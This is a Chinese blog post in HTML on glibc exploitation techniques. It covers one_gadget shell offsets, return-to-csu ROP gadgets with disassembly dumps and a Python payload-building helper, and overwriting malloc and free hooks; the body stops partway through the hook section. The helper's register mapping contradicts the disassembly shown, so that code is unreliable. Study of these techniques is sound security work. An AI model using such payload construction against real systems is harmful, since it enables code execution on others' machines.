@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-lu0k.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-lu0k.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-lu0k.png">
+  <link rel="mask-icon" href="/images/lu0k.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lu0k.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="One gadgetone gadget是glibc中存在的一些执行execve(&#39;&#x2F;bin&#x2F;sh&#39;, NULL, NULL)的片段。当知道glibc的版本，并且通过信息泄露得到glibc的基地址，就可以通过控制EIP&#x2F;RIP(覆盖.got.plt或者函数返回地址等)执行该gadget达到远程代码执行的目的，即获得shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN利用技巧(上)">
+<meta property="og:url" content="https://lu0k.github.io/posts/pwn-skill1/index.html">
+<meta property="og:site_name" content="Lu0k">
+<meta property="og:description" content="One gadgetone gadget是glibc中存在的一些执行execve(&#39;&#x2F;bin&#x2F;sh&#39;, NULL, NULL)的片段。当知道glibc的版本，并且通过信息泄露得到glibc的基地址，就可以通过控制EIP&#x2F;RIP(覆盖.got.plt或者函数返回地址等)执行该gadget达到远程代码执行的目的，即获得shell。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-05T13:42:33.114Z">
+<meta property="article:author" content="Lu0k">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lu0k.github.io/posts/pwn-skill1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lu0k.github.io/posts/pwn-skill1/","path":"posts/pwn-skill1/","title":"PWN利用技巧(上)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PWN利用技巧(上) | Lu0k</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Lu0k</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Lu0k's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#One-gadget"><span class="nav-number">1.</span> <span class="nav-text">One gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E7%94%A8Gadget"><span class="nav-number">2.</span> <span class="nav-text">通用Gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81Hook%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">劫持Hook函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DynELF%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-number">4.</span> <span class="nav-text">DynELF泄露函数地址</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DynELF%E6%A8%A1%E5%9D%97"><span class="nav-number">4.1.</span> <span class="nav-text">DynELF模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DynELF%E5%8E%9F%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">DynELF原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu0k"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lu0k</p>
+  <div class="site-description" itemprop="description">谦虚学习!</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lu0k" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lu0k" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Lu0kMe" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Lu0kMe" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lu0k.github.io/posts/pwn-skill1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lu0k">
+      <meta itemprop="description" content="谦虚学习!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lu0k">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PWN利用技巧(上)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-05 00:00:00" itemprop="dateCreated datePublished" datetime="2021-12-05T00:00:00+08:00">2021-12-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Reading-Notes/" itemprop="url" rel="index"><span itemprop="name">Reading Notes</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One gadget"></a>One gadget</h1><p><code>one gadget</code>是<code>glibc</code>中存在的一些执行<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的片段。当知道<code>glibc</code>的版本，并且通过信息泄露得到<code>glibc</code>的基地址，就可以通过控制<code>EIP/RIP(覆盖.got.plt或者函数返回地址等)</code>执行该<code>gadget</code>达到远程代码执行的目的，即获得<code>shell</code>。</p>
+<span id="more"></span>
+
+<p>相较于调用<code>system(&#39;/bin/sh&#39;)</code>，该方法的优点是简单实用，只需要控制<code>EIP/RIP</code>，无需控制调用函数的参数，例如，在64位程序中，无需控制<code>RDI</code>、<code>RSI</code>、<code>RDX</code>等寄存器。同时，缺点也很明显，它通常需要满足一些限制条件，稳定性会受到一些影响。</p>
+<p>使用工具<code>one_gadget</code>可以很方便地在<code>glibc</code>中查找<code>one gadget</code>。该工具的原理简单地说就是寻找这样一段代码，能够：</p>
+<ul>
+<li>访问<code>&quot;/bin/sh&quot;</code>字符串</li>
+<li>调用<code>execve()</code>函数</li>
+</ul>
+<p>对于所找到代码的限制条件，则是通过符号执行的方式进行约束的。示例如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gem install one_gadget</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> one_gadget /lib/x86_64-linux-gnu/libc-2.31.so</span> </span><br><span class="line">0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
+
+<h1 id="通用Gadget"><a href="#通用Gadget" class="headerlink" title="通用Gadget"></a>通用Gadget</h1><p>64位程序的前六个参数依次通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，所以在构造<code>ROP</code>链的时候，常常需要找到能够给这些寄存器赋值的<code>gadget</code>，例如<code>pop rdi;ret</code>等。幸运的是，在<code>__libc_csu_init()</code>函数中就存在这样的<code>gadget</code>，该函数是每一个使用了<code>glibc</code>的动态链接程序所必备的，称之为通用<code>gadget</code>。利用该通用<code>gadget</code>构造<code>ROP</code>链的方法称为<code>Return-to-csu</code>，该技术适用于开启<code>ASLR</code>、但关闭<code>PIE</code>或者二进制文件在内存中的基地址已知的情况。具体的细节可以查阅<code>Black Hat Asia 2018</code>的议题<a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">Return-to-csu: A New Method to Bypass 64-bit Linux ASLR</a>。</p>
+<p>在Linux程序的启动过程中，<code>__libc_csu_init()</code>函数用于在<code>main()</code>函数调用前做一些初始化工作，其汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble /r __libc_csu_init </span><br><span class="line">Dump of assembler code for function __libc_csu_init:</span><br><span class="line">   0x0000000000001170 &lt;+0&gt;:	f3 0f 1e fa				endbr64 </span><br><span class="line">   0x0000000000001174 &lt;+4&gt;:	41 57					push   r15</span><br><span class="line">   0x0000000000001176 &lt;+6&gt;:	4c 8d 3d 3b 2c 00 00	lea    r15,[rip+0x2c3b]</span><br><span class="line">   0x000000000000117d &lt;+13&gt;:41 56					push   r14</span><br><span class="line">   0x000000000000117f &lt;+15&gt;:49 89 d6				mov    r14,rdx</span><br><span class="line">   0x0000000000001182 &lt;+18&gt;:41 55					push   r13</span><br><span class="line">   0x0000000000001184 &lt;+20&gt;:49 89 f5				mov    r13,rsi</span><br><span class="line">   0x0000000000001187 &lt;+23&gt;:41 54					push   r12</span><br><span class="line">   0x0000000000001189 &lt;+25&gt;:41 89 fc				mov    r12d,edi</span><br><span class="line">   0x000000000000118c &lt;+28&gt;:55						push   rbp</span><br><span class="line">   0x000000000000118d &lt;+29&gt;:48 8d 2d 2c 2c 00 00	lea    rbp,[rip+0x2c2c]</span><br><span class="line">   0x0000000000001194 &lt;+36&gt;:53						push   rbx</span><br><span class="line">   0x0000000000001195 &lt;+37&gt;:4c 29 fd				sub    rbp,r15</span><br><span class="line">   0x0000000000001198 &lt;+40&gt;:48 83 ec 08				sub    rsp,0x8</span><br><span class="line">   0x000000000000119c &lt;+44&gt;:e8 5f fe ff ff			call   0x1000 &lt;_init&gt;</span><br><span class="line">   0x00000000000011a1 &lt;+49&gt;:48 c1 fd 03				sar    rbp,0x3</span><br><span class="line">   0x00000000000011a5 &lt;+53&gt;:74 1f					je     0x11c6 &lt;__libc_csu_init+86&gt;</span><br><span class="line">   0x00000000000011a7 &lt;+55&gt;:31 db					xor    ebx,ebx</span><br><span class="line">   0x00000000000011a9 &lt;+57&gt;:0f 1f 80 00 00 00 00	nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00000000000011b0 &lt;+64&gt;:4c 89 f2				mov    rdx,r14</span><br><span class="line">   0x00000000000011b3 &lt;+67&gt;:4c 89 ee				mov    rsi,r13</span><br><span class="line">   0x00000000000011b6 &lt;+70&gt;:44 89 e7				mov    edi,r12d</span><br><span class="line">   0x00000000000011b9 &lt;+73&gt;:41 ff 14 df				call   QWORD PTR [r15+rbx*8]</span><br><span class="line">   0x00000000000011bd &lt;+77&gt;:48 83 c3 01				add    rbx,0x1</span><br><span class="line">   0x00000000000011c1 &lt;+81&gt;:48 39 dd				cmp    rbp,rbx</span><br><span class="line">   0x00000000000011c4 &lt;+84&gt;:75 ea					jne    0x11b0 &lt;__libc_csu_init+64&gt;</span><br><span class="line">   0x00000000000011c6 &lt;+86&gt;:48 83 c4 08				add    rsp,0x8</span><br><span class="line">   0x00000000000011ca &lt;+90&gt;:5b						pop    rbx</span><br><span class="line">   0x00000000000011cb &lt;+91&gt;:5d						pop    rbp</span><br><span class="line">   0x00000000000011cc &lt;+92&gt;:41 5c					pop    r12</span><br><span class="line">   0x00000000000011ce &lt;+94&gt;:41 5d					pop    r13</span><br><span class="line">   0x00000000000011d0 &lt;+96&gt;:41 5e					pop    r14</span><br><span class="line">   0x00000000000011d2 &lt;+98&gt;:41 5f					pop    r15</span><br><span class="line">   0x00000000000011d4 &lt;+100&gt;:c3						ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>提取出来的通用<code>gadget</code>如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">part1:</span><br><span class="line">   0x00000000000011ca &lt;+90&gt;:5b			pop    rbx</span><br><span class="line">   0x00000000000011cb &lt;+91&gt;:5d			pop    rbp</span><br><span class="line">   0x00000000000011cc &lt;+92&gt;:41 5c		pop    r12</span><br><span class="line">   0x00000000000011ce &lt;+94&gt;:41 5d		pop    r13</span><br><span class="line">   0x00000000000011d0 &lt;+96&gt;:41 5e		pop    r14</span><br><span class="line">   0x00000000000011d2 &lt;+98&gt;:41 5f		pop    r15</span><br><span class="line">   0x00000000000011d4 &lt;+100&gt;:c3			ret</span><br><span class="line">part2:</span><br><span class="line">   0x00000000000011b0 &lt;+64&gt;:4c 89 f2		mov    rdx,r14</span><br><span class="line">   0x00000000000011b3 &lt;+67&gt;:4c 89 ee		mov    rsi,r13</span><br><span class="line">   0x00000000000011b6 &lt;+70&gt;:44 89 e7		mov    edi,r12d</span><br><span class="line">   0x00000000000011b9 &lt;+73&gt;:41 ff 14 df		call   QWORD PTR [r15+rbx*8]</span><br><span class="line">   0x00000000000011bd &lt;+77&gt;:48 83 c3 01		add    rbx,0x1</span><br><span class="line">   0x00000000000011c1 &lt;+81&gt;:48 39 dd		cmp    rbp,rbx</span><br><span class="line">   0x00000000000011c4 &lt;+84&gt;:75 ea			jne    0x11b0 &lt;__libc_csu_init+64&gt;</span><br><span class="line">   0x00000000000011c6 &lt;+86&gt;:48 83 c4 08		add    rsp,0x8</span><br><span class="line">   0x00000000000011ca &lt;+90&gt;:5b				pop    rbx</span><br><span class="line">   0x00000000000011cb &lt;+91&gt;:5d				pop    rbp</span><br><span class="line">   0x00000000000011cc &lt;+92&gt;:41 5c			pop    r12</span><br><span class="line">   0x00000000000011ce &lt;+94&gt;:41 5d			pop    r13</span><br><span class="line">   0x00000000000011d0 &lt;+96&gt;:41 5e			pop    r14</span><br><span class="line">   0x00000000000011d2 &lt;+98&gt;:41 5f			pop    r15</span><br><span class="line">   0x00000000000011d4 &lt;+100&gt;:c3				ret</span><br></pre></td></tr></table></figure>
+
+<p>在构造<code>ROP</code>链时，<code>part1</code>是连续六个<code>pop</code>，可以通过布置栈来设置这些寄存器，然后进入<code>part2</code>，前三条语句分别给三个寄存器赋值，并作为<code>part2</code>调用函数的参数。需要注意的是，第三句<code>r15d</code>给<code>edi</code>赋值，两者皆是32位。</p>
+<p>在使用<code>Python</code>编写利用脚本时，可以直接套用下面的这个函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span></span>):</span></span><br><span class="line">    payload = p64(part1)	<span class="comment"># part1 entry</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)		<span class="comment"># rbx must be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)		<span class="comment"># rbp must be 0x1</span></span><br><span class="line">    payload += p64(jmp2)	<span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)	<span class="comment"># r13 -&gt; rdx arg3</span></span><br><span class="line">    payload += p64(arg2)	<span class="comment"># r14 -&gt; rsi arg2</span></span><br><span class="line">    payload += p64(arg1)	<span class="comment"># r15d -&gt; edi arg1</span></span><br><span class="line">    payload += p64(part2)	<span class="comment"># part2 entry will call</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span>		<span class="comment"># junk 6*8+8=56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>对于关闭了<code>PIE</code>的二进制文件，其加载到内存中的地址是已知的，也就是通用<code>gadget</code>的地址已知，那么只需要泄露<code>glibc</code>的地址即可绕过<code>ASLR</code>；而对于开启了<code>PIE</code>的二进制文件，其内存地址随机，那么就需要先得到这个地址，可以通过<code>Offset2lib</code>技术来实现。在并发服务器<code>(foring server)</code>上，受<code>copy-on-write</code>机制的影响，其复刻的子进程无需再次<code>PIE</code>，所以可以逐字节进行爆破。</p>
+<p>在<code>__libc_csu_init()</code>中，不止上面的这个<code>gadget</code>，对字节码稍作偏移即可找到一些更隐蔽的<code>gadget</code>。例如<code>5e</code>和<code>5f</code>分别是<code>pop rsi</code>和<code>pop rdi</code>的字节码，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /r 0x00000000000011d1, 0x00000000000011d5</span><br><span class="line">Dump of assembler code from 0x11d1 to 0x11d5:</span><br><span class="line">   0x00000000000011d1 &lt;__libc_csu_init+97&gt;:	5e		pop    rsi</span><br><span class="line">   0x00000000000011d2 &lt;__libc_csu_init+98&gt;:	41 5f	pop    r15</span><br><span class="line">   0x00000000000011d4 &lt;__libc_csu_init+100&gt;:c3		ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disassemble /r 0x00000000000011d3, 0x00000000000011d5</span><br><span class="line">Dump of assembler code from 0x11d3 to 0x11d5:</span><br><span class="line">   0x00000000000011d3 &lt;__libc_csu_init+99&gt;:	5f		pop    rdi</span><br><span class="line">   0x00000000000011d4 &lt;__libc_csu_init+100&gt;:c3		ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<h1 id="劫持Hook函数"><a href="#劫持Hook函数" class="headerlink" title="劫持Hook函数"></a>劫持Hook函数</h1><p>在<code>glibc</code>中，通过指定对应的<code>hook</code>函数，可以修改<code>malloc()</code>、<code>realloc()</code>和<code>free()</code>等函数的行为，从而调试使用了动态内存分配的程序。例如，当调用<code>malloc()</code>函数时，程序会首先查看其<code>hook</code>函数是否为空，如果不是就会跳到<code>hook</code>函数处执行。在<code>PWN</code>中，可以利用这一特性，修改<code>hook</code>函数的值<code>(例如one gadget)</code>，使程序在调用<code>malloc()</code>系列函数之前，执行<code>hook</code>所指定的代码片段，从而改变程序流。</p>
+<p><code>__malloc_hook</code>、<code>__realloc_hook</code>和<code>__free_hook</code>都是函数指针变量，在源文件<code>malloc.c</code>中被申明，其中<code>__free_hook</code>的初始值为0，另外两个则分别是各自的初始化函数<code>malloc_hook_ini</code>和<code>realloc_hook_ini</code>。通过信息泄露得到<code>glibc</code>的基地址，将其加上偏移即可得到<code>hook</code>函数变量在内存中的地址，通常该地址所在的内存段都是可读写的，如下所示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s /lib/x86_64-linux-gnu/libc-2.31.so | grep -E <span class="string">&quot;__malloc_hook|__free_hook|__realloc_hook&quot;</span></span></span><br><span class="line">   224: 00000000001eeb28     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5</span><br><span class="line">  1149: 00000000001ebb70     8 OBJECT  WEAK   DEFAULT   31 __malloc_hook@@GLIBC_2.2.5</span><br><span class="line">  1569: 00000000001ebb68     8 OBJECT  WEAK   DEFAULT   31 __realloc_hook@@GLIBC_2.2.5</span><br><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00007ffff7dc4000 0x00007ffff7de9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7de9000 0x00007ffff7f61000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7f61000 0x00007ffff7fab000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7fab000 0x00007ffff7fac000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">gef➤  x/gx 0x00007ffff7dc4000 + 0x1eeb28</span><br><span class="line">0x7ffff7fb2b28 &lt;__free_hook&gt;: 0x0000000000000000</span><br><span class="line">gef➤  x/gx 0x00007ffff7dc4000 + 0x1ebb70</span><br><span class="line">0x7ffff7fafb70 &lt;__malloc_hook&gt;:	0x00007ffff7e60c90</span><br><span class="line">gef➤  x/gx 0x00007ffff7dc4000 + 0x1ebb68</span><br><span class="line">0x7ffff7fafb68 &lt;__realloc_hook&gt;: 0x00007ffff7e61bf0</span><br></pre></td></tr></table></figure>
+
